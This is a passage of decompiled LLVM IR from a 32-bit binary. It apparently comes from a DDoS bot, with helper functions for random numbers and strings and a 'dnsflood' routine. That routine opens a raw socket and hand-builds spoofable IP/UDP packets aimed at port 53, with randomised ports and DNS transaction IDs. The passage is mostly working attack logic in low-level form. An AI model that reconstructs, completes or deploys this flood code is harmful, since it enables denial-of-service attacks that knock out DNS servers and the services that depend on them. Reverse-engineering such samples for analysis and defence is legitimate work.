  %v2_80494cb = load i8, i8* %v1_80494cb, align 1
  %v10_80494cd = icmp eq i8 %v2_80494cb, 46
  %v1_80494cf = icmp eq i1 %v10_80494cd, false
  br i1 %v1_80494cf, label %dec_label_pc_8049503, label %dec_label_pc_80494d1

dec_label_pc_80494d1:                             ; preds = %dec_label_pc_80494c5
  %v3_80494d4 = and i32 %v4_8049506, -256
  %v1_80494d9 = trunc i32 %v4_8049506 to i8
  %v4_80494d9 = sub i8 %v1_80494d9, %stack_var_-16.2
  %v20_80494d9 = zext i8 %v4_80494d9 to i32
  %v23_80494d9 = or i32 %v3_80494d4, %v20_80494d9
  store i32 %v23_80494d9, i32* %edx.global-to-local, align 4
  %v4_80494db = ptrtoint i8* %stack_var_4.2 to i32
  store i8 %v4_80494d9, i8* %stack_var_4.2, align 1
  %v5_80494e0 = add i32 %v4_80494db, 1
  %stack_var_4.015 = inttoptr i32 %v5_80494e0 to i8*
  %v4_80494f816 = sext i8 %stack_var_-16.2 to i32
  %v5_80494fe24 = icmp slt i32 %v4_80494f816, %v4_8049506
  br i1 %v5_80494fe24, label %dec_label_pc_80494e5, label %dec_label_pc_8049500

dec_label_pc_80494e5:                             ; preds = %dec_label_pc_80494d1, %dec_label_pc_80494e5
  %v4_80494f827 = phi i32 [ %v4_80494f8, %dec_label_pc_80494e5 ], [ %v4_80494f816, %dec_label_pc_80494d1 ]
  %stack_var_4.026 = phi i8* [ %stack_var_4.0, %dec_label_pc_80494e5 ], [ %stack_var_4.015, %dec_label_pc_80494d1 ]
  %stack_var_4.0.in25 = phi i32 [ %v5_80494f2, %dec_label_pc_80494e5 ], [ %v5_80494e0, %dec_label_pc_80494d1 ]
  %v6_80494e8 = add i32 %v4_80494f827, %v4_804949b
  %v1_80494eb = inttoptr i32 %v6_80494e8 to i8*
  %v2_80494eb = load i8, i8* %v1_80494eb, align 1
  %v3_80494eb = zext i8 %v2_80494eb to i32
  %v4_80494eb = load i32, i32* %edx.global-to-local, align 4
  %v5_80494eb = and i32 %v4_80494eb, -256
  %v6_80494eb = or i32 %v5_80494eb, %v3_80494eb
  store i32 %v6_80494eb, i32* %edx.global-to-local, align 4
  store i8 %v2_80494eb, i8* %stack_var_4.026, align 1
  %v5_80494f2 = add i32 %stack_var_4.0.in25, 1
  %stack_var_4.0 = inttoptr i32 %v5_80494f2 to i8*
  %v5_80494f5 = mul i32 %v4_80494f827, 16777216
  %sext = add i32 %v5_80494f5, 16777216
  %v4_80494f8 = sdiv i32 %sext, 16777216
  %v5_80494fe = icmp slt i32 %v4_80494f8, %v4_8049506
  br i1 %v5_80494fe, label %dec_label_pc_80494e5, label %dec_label_pc_8049500

dec_label_pc_8049500:                             ; preds = %dec_label_pc_80494e5, %dec_label_pc_80494d1
  %stack_var_4.0.lcssa = phi i8* [ %stack_var_4.015, %dec_label_pc_80494d1 ], [ %stack_var_4.0, %dec_label_pc_80494e5 ]
  %v4_80494f8.lcssa = phi i32 [ %v4_80494f816, %dec_label_pc_80494d1 ], [ %v4_80494f8, %dec_label_pc_80494e5 ]
  %v5_8049500 = add nsw i32 %v4_80494f8.lcssa, 1
  %v14_8049500 = trunc i32 %v5_8049500 to i8
  br label %dec_label_pc_8049503

dec_label_pc_8049503:                             ; preds = %dec_label_pc_80494c5, %dec_label_pc_8049500
  %stack_var_4.1 = phi i8* [ %stack_var_4.2, %dec_label_pc_80494c5 ], [ %stack_var_4.0.lcssa, %dec_label_pc_8049500 ]
  %stack_var_-16.1 = phi i8 [ %stack_var_-16.2, %dec_label_pc_80494c5 ], [ %v14_8049500, %dec_label_pc_8049500 ]
  %v5_8049503 = add i32 %v4_8049506, 1
  %v22_8049503 = inttoptr i32 %v5_8049503 to i8*
  br label %dec_label_pc_8049506

dec_label_pc_8049506:                             ; preds = %entry, %dec_label_pc_8049503
  %stack_var_4.2 = phi i8* [ %tmp, %entry ], [ %stack_var_4.1, %dec_label_pc_8049503 ]
  %stack_var_-16.2 = phi i8 [ 0, %entry ], [ %stack_var_-16.1, %dec_label_pc_8049503 ]
  %storemerge = phi i8* [ null, %entry ], [ %v22_8049503, %dec_label_pc_8049503 ]
  %v4_8049506 = ptrtoint i8* %storemerge to i32
  store i32 %v4_8049506, i32* %edx.global-to-local, align 4
  %v3_804951a = call i32 @_strlen(i8* %v4_80494ab)
  %v7_8049521 = icmp ult i32 %v4_8049506, %v3_804951a
  br i1 %v7_8049521, label %dec_label_pc_80494c5, label %dec_label_pc_8049525

dec_label_pc_8049525:                             ; preds = %dec_label_pc_8049506
  %v4_8049525 = ptrtoint i8* %stack_var_4.2 to i32
  store i8 0, i8* %stack_var_4.2, align 1
  ret i32 %v4_8049525

; uselistorder directives
  uselistorder i32 %v4_8049506, { 0, 7, 3, 1, 5, 2, 4, 6 }
  uselistorder i8 %stack_var_-16.2, { 1, 0, 2 }
  uselistorder i8* %stack_var_4.2, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v4_80494f8, { 2, 0, 1 }
  uselistorder i32 %v5_80494f2, { 1, 0 }
  uselistorder i32 %v4_804949b, { 1, 2, 0, 3 }
  uselistorder i16* %tmp9, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_8049506, { 1, 0 }
  uselistorder label %dec_label_pc_8049503, { 1, 0 }
  uselistorder label %dec_label_pc_80494e5, { 1, 0 }
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @global_var_8074d20.73, align 32
  %v1_8049545 = add i32 %arg1, -1640531527
  store i32 %v1_8049545, i32* @global_var_8074d24.74, align 4
  %v1_8049552 = add i32 %arg1, 1013904242
  store i32 %v1_8049552, i32* %eax.global-to-local, align 4
  store i32 %v1_8049552, i32* @global_var_8074d28.75, align 8
  br label %dec_label_pc_8049565

dec_label_pc_8049565:                             ; preds = %entry, %dec_label_pc_8049565
  %storemerge5 = phi i32 [ 3, %entry ], [ %v4_8049595, %dec_label_pc_8049565 ]
  store i32 %storemerge5, i32* @ecx, align 4
  %v1_804956b = add nsw i32 %storemerge5, -3
  store i32 %v1_804956b, i32* %eax.global-to-local, align 4
  %v1_804956e = mul nuw nsw i32 %v1_804956b, 4
  %v2_804956e = add i32 %v1_804956e, ptrtoint (i32* @global_var_8074d20.73 to i32)
  %v3_804956e = inttoptr i32 %v2_804956e to i32*
  %v4_804956e = load i32, i32* %v3_804956e, align 4
  %v1_8049578 = add nsw i32 %storemerge5, -2
  store i32 %v1_8049578, i32* %eax.global-to-local, align 4
  %v1_804957b = mul nuw nsw i32 %v1_8049578, 4
  %v2_804957b = add i32 %v1_804957b, ptrtoint (i32* @global_var_8074d20.73 to i32)
  %v3_804957b = inttoptr i32 %v2_804957b to i32*
  %v4_804957b = load i32, i32* %v3_804957b, align 4
  %v2_8049582 = xor i32 %v4_804957b, %v4_804956e
  %v2_8049587 = xor i32 %storemerge5, -1640531527
  %v1_8049589 = xor i32 %v2_8049587, %v2_8049582
  store i32 %v1_8049589, i32* %eax.global-to-local, align 4
  %v2_804958e = mul nuw nsw i32 %storemerge5, 4
  %v3_804958e = add i32 %v2_804958e, ptrtoint (i32* @global_var_8074d20.73 to i32)
  %v4_804958e = inttoptr i32 %v3_804958e to i32*
  store i32 %v1_8049589, i32* %v4_804958e, align 4
  %v4_8049595 = add nuw nsw i32 %storemerge5, 1
  %exitcond = icmp eq i32 %v4_8049595, 4096
  br i1 %exitcond, label %dec_label_pc_80495a1, label %dec_label_pc_8049565

dec_label_pc_80495a1:                             ; preds = %dec_label_pc_8049565
  %v0_80495a2 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_80495a2

; uselistorder directives
  uselistorder i32 %storemerge5, { 3, 4, 5, 2, 0, 1 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8049565, { 1, 0 }
}

define i32 @rand_cmwc(i32 %arg1) local_unnamed_addr {
entry:
  %v0_80495bf = load i32, i32* @global_var_806ffa4.76, align 4
  %v1_80495c4 = add i32 %v0_80495bf, 1
  %v1_80495c5 = urem i32 %v1_80495c4, 4096
  store i32 %v1_80495c5, i32* @global_var_806ffa4.76, align 4
  %v1_80495d4 = mul nuw nsw i32 %v1_80495c5, 4
  %v2_80495d4 = add i32 %v1_80495d4, ptrtoint (i32* @global_var_8074d20.73 to i32)
  %v3_80495d4 = inttoptr i32 %v2_80495d4 to i32*
  %v4_80495d4 = load i32, i32* %v3_80495d4, align 4
  %v7_80495f1 = udiv i32 %v4_80495d4, 228675
  store i32 %v7_80495f1, i32* @global_var_806ffa0.77, align 32
  br i1 true, label %dec_label_pc_8049641, label %dec_label_pc_8049633

dec_label_pc_8049633:                             ; preds = %entry
  br label %dec_label_pc_8049641

dec_label_pc_8049641:                             ; preds = %entry, %dec_label_pc_8049633
  store i32 %v1_80495c5, i32* @ecx, align 4
  %v1_8049656 = mul nuw nsw i32 %v1_80495c5, 4
  %v2_8049656 = add i32 %v1_8049656, ptrtoint (i32* @global_var_8074d20.73 to i32)
  %v3_8049656 = inttoptr i32 %v2_8049656 to i32*
  %v4_8049656 = load i32, i32* %v3_8049656, align 4
  ret i32 %v4_8049656

; uselistorder directives
  uselistorder i32 %v1_80495c5, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8049641, { 1, 0 }
}

define i32 @myStrCat(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_804966b16 = ptrtoint i8* %arg1 to i32
  %v2_804966e17 = load i8, i8* %arg1, align 1
  %v4_804967021 = icmp eq i8 %v2_804966e17, 0
  %v1_804967222 = icmp eq i1 %v4_804967021, false
  br i1 %v1_804967222, label %dec_label_pc_8049668, label %dec_label_pc_8049686.preheader

dec_label_pc_8049668:                             ; preds = %entry, %dec_label_pc_8049668
  %v4_804966b23 = phi i32 [ %v5_8049668, %dec_label_pc_8049668 ], [ %v4_804966b16, %entry ]
  %v5_8049668 = add i32 %v4_804966b23, 1
  %v22_8049668 = inttoptr i32 %v5_8049668 to i8*
  %v2_804966e = load i8, i8* %v22_8049668, align 1
  %v4_8049670 = icmp eq i8 %v2_804966e, 0
  %v1_8049672 = icmp eq i1 %v4_8049670, false
  br i1 %v1_8049672, label %dec_label_pc_8049668, label %dec_label_pc_8049686.preheader

dec_label_pc_8049686.preheader:                   ; preds = %dec_label_pc_8049668, %entry
  %stack_var_4.0.lcssa = phi i8* [ %arg1, %entry ], [ %v22_8049668, %dec_label_pc_8049668 ]
  %stack_var_8.06 = inttoptr i32 %arg2 to i8*
  %v2_80496897 = load i8, i8* %stack_var_8.06, align 1
  %v4_804968b11 = icmp eq i8 %v2_80496897, 0
  %v1_804968d12 = icmp eq i1 %v4_804968b11, false
  br i1 %v1_804968d12, label %dec_label_pc_8049676, label %dec_label_pc_804968f

dec_label_pc_8049676:                             ; preds = %dec_label_pc_8049686.preheader, %dec_label_pc_8049676
  %stack_var_8.015 = phi i8* [ %stack_var_8.0, %dec_label_pc_8049676 ], [ %stack_var_8.06, %dec_label_pc_8049686.preheader ]
  %stack_var_8.0.in14 = phi i32 [ %v5_8049683, %dec_label_pc_8049676 ], [ %arg2, %dec_label_pc_8049686.preheader ]
  %stack_var_4.113 = phi i8* [ %v22_8049680, %dec_label_pc_8049676 ], [ %stack_var_4.0.lcssa, %dec_label_pc_8049686.preheader ]
  %v2_8049679 = load i8, i8* %stack_var_8.015, align 1
  %v3_8049679 = zext i8 %v2_8049679 to i32
  %v4_8049679 = load i32, i32* @edx, align 4
  %v5_8049679 = and i32 %v4_8049679, -256
  %v6_8049679 = or i32 %v5_8049679, %v3_8049679
  store i32 %v6_8049679, i32* @edx, align 4
  %v4_804967b = ptrtoint i8* %stack_var_4.113 to i32
  store i8 %v2_8049679, i8* %stack_var_4.113, align 1
  %v5_8049680 = add i32 %v4_804967b, 1
  %v22_8049680 = inttoptr i32 %v5_8049680 to i8*
  %v5_8049683 = add i32 %stack_var_8.0.in14, 1
  %stack_var_8.0 = inttoptr i32 %v5_8049683 to i8*
  %v2_8049689 = load i8, i8* %stack_var_8.0, align 1
  %v4_804968b = icmp eq i8 %v2_8049689, 0
  %v1_804968d = icmp eq i1 %v4_804968b, false
  br i1 %v1_804968d, label %dec_label_pc_8049676, label %dec_label_pc_804968f

dec_label_pc_804968f:                             ; preds = %dec_label_pc_8049676, %dec_label_pc_8049686.preheader
  %stack_var_4.1.lcssa = phi i8* [ %stack_var_4.0.lcssa, %dec_label_pc_8049686.preheader ], [ %v22_8049680, %dec_label_pc_8049676 ]
  %v4_804968f = ptrtoint i8* %stack_var_4.1.lcssa to i32
  store i8 0, i8* %stack_var_4.1.lcssa, align 1
  ret i32 %v4_804968f

; uselistorder directives
  uselistorder i8* %stack_var_8.0, { 1, 0 }
  uselistorder i32 %v5_8049683, { 1, 0 }
  uselistorder i32 %v5_8049668, { 1, 0 }
  uselistorder label %dec_label_pc_8049676, { 1, 0 }
  uselistorder label %dec_label_pc_8049668, { 1, 0 }
}

define i32 @replStr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i8*, align 4
  %stack_var_4 = alloca i8*, align 4
  store i8* %arg1, i8** %stack_var_4, align 4
  %v5_80496a1 = icmp eq i32 %arg2, 0
  %v1_80496a5 = icmp eq i1 %v5_80496a1, false
  br i1 %v1_80496a5, label %dec_label_pc_80496b0, label %dec_label_pc_8049726

dec_label_pc_80496b0:                             ; preds = %entry
  %v4_80496b0 = ptrtoint i8* %arg1 to i32
  store i1 false, i1* @df, align 1
  store i32 %v4_80496b0, i32* @edi, align 4
  %v3_80496c1 = call i32 @_strlen(i8* %arg1)
  %v4_80496c1 = mul i32 %v3_80496c1, -1
  %v5_80496c1 = add i32 %v4_80496c1, -2
  store i32 %v5_80496c1, i32* @ecx, align 4
  %v8_80496c8 = mul i32 %v3_80496c1, %arg2
  %v6_80496cc = add i32 %v8_80496c8, %arg2
  %v2_80496d3 = call i32 @malloc(i32 %v6_80496cc)
  %tmp29 = bitcast i8** %stack_var_-16 to i32*
  store i32 %v2_80496d3, i32* %tmp29, align 4
  %v5_80496de = icmp eq i32 %v2_80496d3, 0
  %v1_80496e2 = icmp eq i1 %v5_80496de, false
  br i1 %v1_80496e2, label %dec_label_pc_80496ed, label %dec_label_pc_8049726

dec_label_pc_80496ed:                             ; preds = %dec_label_pc_80496b0
  %tmp30 = inttoptr i32 %v2_80496d3 to i8*
  store i8 0, i8* %tmp30, align 1
  %tmp31 = bitcast i8** %stack_var_4 to i32*
  %v3_80496f37 = load i32, i32* %tmp31, align 4
  %v3_80496f6 = load i8*, i8** %stack_var_-16, align 4
  %v4_80496f6 = ptrtoint i8* %v3_80496f6 to i32
  %v4_80496f9 = call i32 @myStrCat(i8* %v3_80496f6, i32 %v3_80496f37)
  %v5_804971732 = add i32 %arg2, -1
  %v12_804971733 = icmp eq i32 %v5_804971732, 0
  %v1_804971e34 = icmp eq i1 %v12_804971733, false
  br i1 %v1_804971e34, label %dec_label_pc_8049706, label %dec_label_pc_8049720

dec_label_pc_8049706:                             ; preds = %dec_label_pc_80496ed, %dec_label_pc_8049706
  %v5_804971736 = phi i32 [ %v5_8049717, %dec_label_pc_8049706 ], [ %v5_804971732, %dec_label_pc_80496ed ]
  %storemerge1535 = phi i32 [ %v4_804970c, %dec_label_pc_8049706 ], [ %v4_80496f9, %dec_label_pc_80496ed ]
  %v3_804970c = inttoptr i32 %storemerge1535 to i8*
  %v4_804970c = call i32 @myStrCat(i8* %v3_804970c, i32 %v3_80496f37)
  %v5_8049717 = add i32 %v5_804971736, -1
  %v12_8049717 = icmp eq i32 %v5_8049717, 0
  %v1_804971e = icmp eq i1 %v12_8049717, false
  br i1 %v1_804971e, label %dec_label_pc_8049706, label %dec_label_pc_8049720

dec_label_pc_8049720:                             ; preds = %dec_label_pc_8049706, %dec_label_pc_80496ed
  br label %dec_label_pc_8049726

dec_label_pc_8049726:                             ; preds = %dec_label_pc_80496b0, %entry, %dec_label_pc_8049720
  %stack_var_-28.0 = phi i32 [ %v4_80496f6, %dec_label_pc_8049720 ], [ 0, %entry ], [ 0, %dec_label_pc_80496b0 ]
  ret i32 %stack_var_-28.0

; uselistorder directives
  uselistorder i32 %v5_8049717, { 1, 0 }
  uselistorder i32 %v3_80496f37, { 1, 0 }
  uselistorder i32 %v2_80496d3, { 0, 2, 1 }
  uselistorder i8** %stack_var_-16, { 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder i8* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8049726, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8049706, { 1, 0 }
}

define i32 @setup_udp_header(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8049732 = load i32, i32* @eax, align 4
  ret i32 %v0_8049732
}

define i32 @dnsflood() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp59 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4684 = alloca i32, align 4
  %stack_var_-4156 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8049736 = load i32, i32* @edi, align 4
  store i32 %v0_8049736, i32* %stack_var_-8, align 4
  %v1_804973d = call i32 @listFork(i32 %v0_8049736)
  store i32 %v1_804973d, i32* %eax.global-to-local, align 4
  %v1_8049742 = icmp eq i32 %v1_804973d, 0
  %v1_8049744 = icmp eq i1 %v1_8049742, false
  br i1 %v1_8049744, label %dec_label_pc_8049cae, label %dec_label_pc_804974a

dec_label_pc_804974a:                             ; preds = %entry
  store i32 %tmp59, i32* %eax.global-to-local, align 4
  store i32 %tmp59, i32* %edx.global-to-local, align 4
  %v1_804975a = add i32 %tmp59, 8
  %v2_804975a = inttoptr i32 %v1_804975a to i32*
  %v3_804975a = load i32, i32* %v2_804975a, align 4
  store i32 %v3_804975a, i32* %eax.global-to-local, align 4
  %v1_8049763 = add i32 %tmp59, 12
  %v2_8049763 = inttoptr i32 %v1_8049763 to i32*
  %v3_8049763 = load i32, i32* %v2_8049763, align 4
  store i32 %tmp59, i32* %eax.global-to-local, align 4
  %v1_8049781 = add i32 %tmp59, 4
  %v2_8049781 = inttoptr i32 %v1_8049781 to i32*
  %v3_8049781 = load i32, i32* %v2_8049781, align 4
  store i32 %tmp59, i32* %eax.global-to-local, align 4
  %v1_804978a = add i32 %tmp59, 24
  %v2_804978a = inttoptr i32 %v1_804978a to i32*
  %v3_804978a = load i32, i32* %v2_804978a, align 4
  store i32 %v3_804978a, i32* %eax.global-to-local, align 4
  %v4_804979c = call i32 @socket(i32 2, i32 3, i32 255)
  store i32 %v4_804979c, i32* %eax.global-to-local, align 4
  %v5_80497a7 = icmp slt i32 %v4_804979c, 0
  %v1_80497ab = icmp eq i1 %v5_80497a7, false
  br i1 %v1_80497ab, label %dec_label_pc_80497b7, label %dec_label_pc_80497ad

dec_label_pc_80497ad:                             ; preds = %dec_label_pc_804974a
  %v2_80497b2 = call i32 @__GI_exit(i32 -1)
  store i32 %v2_80497b2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80497b7

dec_label_pc_80497b7:                             ; preds = %dec_label_pc_804974a, %dec_label_pc_80497ad
  %v3_80497bc = call i32 @__GI_time(i32* null)
  store i32 %v3_80497bc, i32* %eax.global-to-local, align 4
  %v1_80497c5 = call i32 @init_rand(i32 %v3_80497bc)
  %v2_80497cd = ptrtoint i32* %stack_var_-4156 to i32
  store i32 %v2_80497cd, i32* %edx.global-to-local, align 4
  store i32 4096, i32* %eax.global-to-local, align 4
  %tmp70 = bitcast i32* %stack_var_-4156 to i8*
  %v5_80497e1 = call i32 @__GI_memset(i8* %tmp70, i32 0, i32 4096)
  store i32 %v2_80497cd, i32* %edx.global-to-local, align 4
  store i8 69, i8* %tmp70, align 4
  %v1_804980f = or i32 %v2_80497cd, 1
  %v2_804980f = inttoptr i32 %v1_804980f to i8*
  store i8 0, i8* %v2_804980f, align 1
  store i32 %v2_80497cd, i32* %eax.global-to-local, align 4
  %v1_8049816 = or i32 %v2_80497cd, 2
  %v2_8049816 = inttoptr i32 %v1_8049816 to i16*
  store i16 58, i16* %v2_8049816, align 2
  %v2_8049824 = call i32 @htonl(i32 54321)
  %v3_8049824 = trunc i32 %v2_8049824 to i16
  %sext8 = mul i32 %v2_8049824, 65536
  %v1_804982c = sdiv i32 %sext8, 65536
  store i32 %v1_804982c, i32* @edx, align 4
  %v3_8049831 = add i32 %v2_80497cd, 4
  %v4_8049831 = inttoptr i32 %v3_8049831 to i16*
  store i16 %v3_8049824, i16* %v4_8049831, align 4
  %v1_8049838 = add i32 %v2_80497cd, 6
  %v2_8049838 = inttoptr i32 %v1_8049838 to i16*
  store i16 0, i16* %v2_8049838, align 2
  %v1_8049841 = add i32 %v2_80497cd, 8
  %v2_8049841 = inttoptr i32 %v1_8049841 to i8*
  store i8 -1, i8* %v2_8049841, align 4
  %v1_8049848 = add i32 %v2_80497cd, 9
  %v2_8049848 = inttoptr i32 %v1_8049848 to i8*
  store i8 17, i8* %v2_8049848, align 1
  store i32 %v2_80497cd, i32* %eax.global-to-local, align 4
  %v1_804984f = add i32 %v2_80497cd, 10
  %v2_804984f = inttoptr i32 %v1_804984f to i16*
  store i16 0, i16* %v2_804984f, align 2
  %v2_804985d = call i32 @inet_addr(i32 ptrtoint ([14 x i8]* @global_var_8068d85.78 to i32))
  %v2_804986a = add i32 %v2_80497cd, 12
  %v3_804986a = inttoptr i32 %v2_804986a to i32*
  store i32 %v2_804985d, i32* %v3_804986a, align 4
  store i32 20, i32* %edx.global-to-local, align 4
  %v2_8049881 = add i32 %v2_80497cd, 20
  %v5_8049883 = inttoptr i32 %v2_8049881 to i16*
  %v1_8049889 = urem i32 %v3_804978a, 65536
  store i32 %v1_8049889, i32* %eax.global-to-local, align 4
  %v2_8049892 = call i32 @htons(i32 %v1_8049889)
  %v3_8049892 = trunc i32 %v2_8049892 to i16
  %sext9 = mul i32 %v2_8049892, 65536
  %v1_804989a = sdiv i32 %sext9, 65536
  store i32 %v1_804989a, i32* %edx.global-to-local, align 4
  store i32 %v2_8049881, i32* %eax.global-to-local, align 4
  store i16 %v3_8049892, i16* %v5_8049883, align 4
  %v2_80498a7 = call i32 @htons(i32 53)
  %v3_80498a7 = trunc i32 %v2_80498a7 to i16
  %v3_80498b4 = add i32 %v2_80497cd, 22
  %v4_80498b4 = inttoptr i32 %v3_80498b4 to i16*
  store i16 %v3_80498a7, i16* %v4_80498b4, align 2
  %v1_80498bb = add i32 %v2_80497cd, 26
  %v2_80498bb = inttoptr i32 %v1_80498bb to i16*
  store i16 0, i16* %v2_80498bb, align 2
  store i32 28, i32* %edx.global-to-local, align 4
  %v2_80498d5 = add i32 %v2_80497cd, 28
  store i32 %v2_80498d5, i32* %eax.global-to-local, align 4
  %v5_80498d7 = inttoptr i32 %v2_80498d5 to i16*
  %v1_80498da = call i32 @rand_cmwc(i32 28)
  %v1_80498df = urem i32 %v1_80498da, 65536
  store i32 %v1_80498df, i32* %eax.global-to-local, align 4
  %v2_80498e8 = call i32 @htons(i32 %v1_80498df)
  %v3_80498e8 = trunc i32 %v2_80498e8 to i16
  store i32 %v2_80498d5, i32* %eax.global-to-local, align 4
  store i16 %v3_80498e8, i16* %v5_80498d7, align 4
  store i32 %v2_80498d5, i32* %edx.global-to-local, align 4
  %v1_80498fb = add i32 %v2_80497cd, 30
  %v2_80498fb = inttoptr i32 %v1_80498fb to i8*
  %v3_80498fb = load i8, i8* %v2_80498fb, align 2
  %tmp = urem i8 %v3_80498fb, -128
  %v1_80498fe = zext i8 %tmp to i32
  store i32 %v1_80498fe, i32* %eax.global-to-local, align 4
  store i8 %tmp, i8* %v2_80498fb, align 2
  store i32 %v2_80498d5, i32* %edx.global-to-local, align 4
  %v3_8049907 = load i8, i8* %v2_80498fb, align 2
  %v4_8049907 = zext i8 %v3_8049907 to i32
  %v5_8049907 = load i32, i32* %eax.global-to-local, align 4
  %v6_8049907 = and i32 %v5_8049907, -256
  %v4_8049907.masked = and i32 %v4_8049907, 135
  %v1_804990a = or i32 %v6_8049907, %v4_8049907.masked
  %v4_804990a = trunc i32 %v4_8049907.masked to i8
  store i32 %v1_804990a, i32* %eax.global-to-local, align 4
  store i8 %v4_804990a, i8* %v2_80498fb, align 2
  store i32 %v2_80498d5, i32* %edx.global-to-local, align 4
  %v3_8049913 = load i8, i8* %v2_80498fb, align 2
  %v4_8049913 = zext i8 %v3_8049913 to i32
  %v5_8049913 = load i32, i32* %eax.global-to-local, align 4
  %v6_8049913 = and i32 %v5_8049913, -256
  %v4_8049913.masked = and i32 %v4_8049913, 251
  %v1_8049916 = or i32 %v6_8049913, %v4_8049913.masked
  %v4_8049916 = trunc i32 %v4_8049913.masked to i8
  store i32 %v1_8049916, i32* %eax.global-to-local, align 4
  store i8 %v4_8049916, i8* %v2_80498fb, align 2
  store i32 %v2_80498d5, i32* %edx.global-to-local, align 4
  %v3_804991f = load i8, i8* %v2_80498fb, align 2
  %v4_804991f = zext i8 %v3_804991f to i32
  %v5_804991f = load i32, i32* %eax.global-to-local, align 4
  %v6_804991f = and i32 %v5_804991f, -256
  %v4_804991f.masked = and i32 %v4_804991f, 253
  %v1_8049922 = or i32 %v6_804991f, %v4_804991f.masked
  %v4_8049922 = trunc i32 %v4_804991f.masked to i8
  store i32 %v1_8049922, i32* %eax.global-to-local, align 4
  store i8 %v4_8049922, i8* %v2_80498fb, align 2
  store i32 %v2_80498d5, i32* %edx.global-to-local, align 4
  %v3_804992b = load i8, i8* %v2_80498fb, align 2
  %v4_804992b = zext i8 %v3_804992b to i32
  %v5_804992b = load i32, i32* %eax.global-to-local, align 4
  %v6_804992b = and i32 %v5_804992b, -256
  %v7_804992b = or i32 %v4_804992b, %v6_804992b
  %v1_804992e = or i32 %v7_804992b, 1
  %v3_804992e = trunc i32 %v1_804992e to i8
  store i32 %v1_804992e, i32* %eax.global-to-local, align 4
  store i8 %v3_804992e, i8* %v2_80498fb, align 2
  store i32 %v2_80498d5, i32* %edx.global-to-local, align 4
  %v1_8049937 = add i32 %v2_80497cd, 31
  %v2_8049937 = inttoptr i32 %v1_8049937 to i8*
  %v3_8049937 = load i8, i8* %v2_8049937, align 1
  %tmp75 = urem i8 %v3_8049937, -128
  %v1_804993a = zext i8 %tmp75 to i32
  store i32 %v1_804993a, i32* %eax.global-to-local, align 4
  store i8 %tmp75, i8* %v2_8049937, align 1
  store i32 %v2_80498d5, i32* %edx.global-to-local, align 4
  %v3_8049943 = load i8, i8* %v2_8049937, align 1
  %v4_8049943 = zext i8 %v3_8049943 to i32
  %v5_8049943 = load i32, i32* %eax.global-to-local, align 4
  %v6_8049943 = and i32 %v5_8049943, -256
  %v4_8049943.masked = and i32 %v4_8049943, 191
  %v1_8049946 = or i32 %v6_8049943, %v4_8049943.masked
  %v4_8049946 = trunc i32 %v4_8049943.masked to i8
  store i32 %v1_8049946, i32* %eax.global-to-local, align 4
  store i8 %v4_8049946, i8* %v2_8049937, align 1
  store i32 %v2_80498d5, i32* %edx.global-to-local, align 4
  %v3_804994f = load i8, i8* %v2_8049937, align 1
  %v4_804994f = zext i8 %v3_804994f to i32
  %v5_804994f = load i32, i32* %eax.global-to-local, align 4
  %v6_804994f = and i32 %v5_804994f, -256
  %v4_804994f.masked = and i32 %v4_804994f, 223
  %v1_8049952 = or i32 %v6_804994f, %v4_804994f.masked
  %v4_8049952 = trunc i32 %v4_804994f.masked to i8
  store i32 %v1_8049952, i32* %eax.global-to-local, align 4
  store i8 %v4_8049952, i8* %v2_8049937, align 1
  store i32 %v2_80498d5, i32* %edx.global-to-local, align 4
  %v3_804995b = load i8, i8* %v2_8049937, align 1
  %v4_804995b = zext i8 %v3_804995b to i32
  %v5_804995b = load i32, i32* %eax.global-to-local, align 4
  %v6_804995b = and i32 %v5_804995b, -256
  %v4_804995b.masked = and i32 %v4_804995b, 239
  %v1_804995e = or i32 %v6_804995b, %v4_804995b.masked
  %v4_804995e = trunc i32 %v4_804995b.masked to i8
  store i32 %v1_804995e, i32* %eax.global-to-local, align 4
  store i8 %v4_804995e, i8* %v2_8049937, align 1
  store i32 %v2_80498d5, i32* %edx.global-to-local, align 4
  %v3_8049967 = load i8, i8* %v2_8049937, align 1
  %v4_8049967 = zext i8 %v3_8049967 to i32
  %v5_8049967 = load i32, i32* %eax.global-to-local, align 4
  %v6_8049967 = and i32 %v5_8049967, -256
  %v4_8049967.masked = and i32 %v4_8049967, 240
  %v1_804996a = or i32 %v6_8049967, %v4_8049967.masked
  %v4_804996a = trunc i32 %v4_8049967.masked to i8
  store i32 %v1_804996a, i32* %eax.global-to-local, align 4
  store i8 %v4_804996a, i8* %v2_8049937, align 1
  %v2_8049975 = call i32 @htons(i32 1)
  %v3_8049975 = trunc i32 %v2_8049975 to i16
  %sext12 = mul i32 %v2_8049975, 65536
  %v1_804997d = sdiv i32 %sext12, 65536
  store i32 %v1_804997d, i32* %edx.global-to-local, align 4
  %v3_8049982 = add i32 %v2_80497cd, 32
  %v4_8049982 = inttoptr i32 %v3_8049982 to i16*
  store i16 %v3_8049975, i16* %v4_8049982, align 4
  %v1_8049989 = add i32 %v2_80497cd, 34
  %v2_8049989 = inttoptr i32 %v1_8049989 to i16*
  store i16 0, i16* %v2_8049989, align 2
  store i32 %v2_80498d5, i32* %eax.global-to-local, align 4
  %v1_8049992 = add i32 %v2_80497cd, 36
  %v2_8049992 = inttoptr i32 %v1_8049992 to i16*
  store i16 0, i16* %v2_8049992, align 4
  %v2_804999d = call i32 @htons(i32 1)
  %v3_804999d = trunc i32 %v2_804999d to i16
